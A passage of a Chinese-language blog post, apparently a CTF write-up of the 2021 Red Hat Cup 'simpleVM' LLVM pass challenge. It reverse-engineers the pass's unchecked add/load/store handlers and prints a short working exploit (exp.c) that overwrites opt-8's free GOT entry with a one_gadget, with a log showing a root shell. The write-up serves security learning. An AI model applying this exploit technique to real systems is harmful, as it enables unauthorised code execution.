+<h2 id="0x05-红帽杯-simpleVM"><a href="#0x05-红帽杯-simpleVM" class="headerlink" title="0x05 红帽杯 simpleVM"></a>0x05 红帽杯 simpleVM</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>首先找到注册函数<br><img src="https://p4.ssl.qhimg.com/t01dffebcf98ad099ac.png"><br>跟进以后，找到虚表位置<br><img src="https://p5.ssl.qhimg.com/t017d4c9fddd1070de3.png"><br>找到<code>runOnFunction</code>函数的地址<br><img src="https://p2.ssl.qhimg.com/t0182db0283a4d1a93e.png"><br>这里先是对当前遍历到的函数名进行匹配<br><img src="https://p2.ssl.qhimg.com/t01b86d228280cb4d46.png"><br>如果函数名是<code>o0o0o0o0</code>，则调用函数<code>sub_7F5C11B24AC0</code>进行进一步处理<br><img src="https://p2.ssl.qhimg.com/t018166487d78e76506.png"><br>可以看到该函数遍历IR中<code>o0o0o0o0</code>函数中的<code>BasicBlock(基本代码块)</code>，然后继续调用<code>sub_7F5C11B24B80</code>函数进行处理<br>该函数会遍历<code>BasicBlock(基本代码块)</code>中的指令，然后匹配到对应指令后进行处理，这里匹配到<code>add函数</code>时，会根据其操作数1的值，来选择对应的存储区（这里我们可以看做寄存器），将操作数2累加上去<br><img src="https://p1.ssl.qhimg.com/t011efea09ab4c80f42.png"><br>当匹配到<code>load</code>操作时，将对应的寄存器中的值看做是地址，从地址中取出8字节数据存入另一个寄存器中<br><img src="https://p3.ssl.qhimg.com/t01521200b12176114f.png"><br>可以看到<code>load</code>的处理过程中，并没有边界检查，而且其寄存器中的值可以通过<code>add</code>来完全控制，由此这里出现一个<code>任意地址读</code>的漏洞，同理，我们看到<code>store</code>，同理存在<code>任意地址写</code>的漏洞。<br><img src="https://p2.ssl.qhimg.com/t01955f98443fefee6f.png"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于优化器<code>opt-8</code>未开启PIE和GOT完全保护，因此，可以借助<code>add、load、store</code>来完成对<code>opt-8</code>二进制程序的GOT表的改写，可以直接将<code>opt-8</code>二进制程序的GOT表中的free表项改为<code>one_gadget</code>，即可获得<code>shell</code><br>exp.c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void store(int a);</span><br><span class="line">void load(int a);</span><br><span class="line">void add(int a, int b);</span><br><span class="line"></span><br><span class="line">void o0o0o0o0()&#123;</span><br><span class="line">    add(1, 0x77e100);</span><br><span class="line">    load(1);</span><br><span class="line">    add(2, 0x729ec);</span><br><span class="line">    store(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用<code>clang -emit-llvm -S exp.c -o exp.ll</code>得到IR文本文件，然后传给<code>opt-8</code>进行优化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop# ./opt-8 -load ./VMPass.so -VMPass ./exp.ll</span><br><span class="line">WARNING: You&#x27;re attempting to print out a bitcode file.</span><br><span class="line">This is inadvisable as it may cause display problems. If</span><br><span class="line">you REALLY want to taste LLVM bitcode first-hand, you</span><br><span class="line">can force output with the `-f&#x27; option.</span><br><span class="line"></span><br><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line"># </span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-感想"><a href="#0x06-感想" class="headerlink" title="0x06 感想"></a>0x06 感想</h2><p>学习并入门了LLVM PASS，收获很多！</p>
+<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a target="_blank" rel="noopener" href="https://eqqie.cn/index.php/laji_note/1655/">[红帽杯 2021] PWN – Writeup</a><br><a target="_blank" rel="noopener" href="https://llvm.org/docs/WritingAnLLVMPass.html">Writing an LLVM Pass — LLVM 12 documentation</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/122522485">LLVM Pass入门导引</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jourluohua/p/14556184.html">LLVM Pass 简介（2）</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/LLVM-PASS/" rel="tag"># LLVM PASS</a>
+              <a href="/ha1vk/tags/%E7%BC%96%E8%AF%91%E5%99%A8/" rel="tag"># 编译器</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/05/20/AntCTFxD3CTF-EasyChromeFullChain/" rel="prev" title="沙箱逃逸分析 AntCTF x D^3CTF EasyChromeFullChain">
+      <i class="fa fa-chevron-left"></i> 沙箱逃逸分析 AntCTF x D^3CTF EasyChromeFullChain
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/06/21/CVE-2018-4233/" rel="next" title="Pwn2Own 2018 CVE-2018-4233 分析">
+      Pwn2Own 2018 CVE-2018-4233 分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-LLVM-PASS"><span class="nav-number">2.</span> <span class="nav-text">0x01 LLVM PASS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-LLVM-IR"><span class="nav-number">3.</span> <span class="nav-text">0x02 LLVM IR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84LLVM-PASS"><span class="nav-number">4.</span> <span class="nav-text">0x03 编写一个简单的LLVM PASS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-LLVM-PASS%E6%A8%A1%E5%9D%97%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">0x04 LLVM PASS模块逆向分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">5.2.</span> <span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E7%BA%A2%E5%B8%BD%E6%9D%AF-simpleVM"><span class="nav-number">6.</span> <span class="nav-text">0x05 红帽杯 simpleVM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">6.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">6.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%84%9F%E6%83%B3"><span class="nav-number">7.</span> <span class="nav-text">0x06 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%8F%82%E8%80%83"><span class="nav-number">8.</span> <span class="nav-text">0x07 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
